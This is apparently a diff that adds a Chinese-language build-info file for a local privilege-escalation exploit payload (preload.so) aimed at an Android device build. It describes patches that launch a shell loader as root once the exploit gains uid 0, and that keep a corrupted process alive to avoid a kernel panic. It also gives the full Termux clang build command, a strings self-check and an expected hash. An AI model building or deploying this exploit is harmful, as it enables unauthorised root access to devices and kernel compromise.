@@ -1,0 +1,27 @@
+# BUILD_INFO — exploit 载荷（preload.so）构建信息
+
+## 源
+payload_src/mt87_build/  = mt87 基线 + 本仓库补丁：
+  (1) ASK7: 在 mt47 gate 命中处（真 uid=0）以 root 启动官方 userspace 装载器
+      system("/system/bin/sh /data/local/tmp/ksu_go.sh > /data/local/tmp/ksu_go.log 2>&1 &");
+  (2) ASK8: PSELECT_HOLD=1 —— 持毒进程永不退出
+      （否则 _exit -> mm teardown -> page_remove_rmap/lock_page_memcg panic）
+  (3) KO fd 修复：每次按路径重开（旧逻辑复用已 close 的 fd => EBADF）
+  (4) finit flags=3 的重试条件放宽到「除 ENOENT 外都试」
+
+## 构建（Termux clang，无需 NDK）
+make PROJECT=matisse-OS2.0.6.0.ULKCNXM CC=clang SYSROOT=$PREFIX \
+     RESOURCE_DIR=$(clang -print-resource-dir) \
+     COMMON_CFLAGS="-O2 -g0 -Wall -Wextra -Isrc -I$PREFIX/include"
+# 产物: build/matisse-OS2.0.6.0.ULKCNXM/bin/preload.so
+
+## 自检（确认补丁真的进了二进制）
+strings build/matisse-OS2.0.6.0.ULKCNXM/bin/preload.so | grep -E 'ksu_go.sh|HOLD engaged'
+# 期望看到:
+#   /system/bin/sh /data/local/tmp/ksu_go.sh > /data/local/tmp/ksu_go.log 2>&1 &
+#   mt88: HOLD engaged - parking forever ...
+
+## 期望哈希（本作者构建的产物，sha256）
+390597469145a735b2e49470fe67e3272d8c3d73c11a8632a965c02544be0acb
+# 注意: 不同 clang 版本 / 不同优化参数会改变字节, 哈希可能不同;
+#       请以「源码一致 + 字符串自检」为准, 不要唯哈希论。
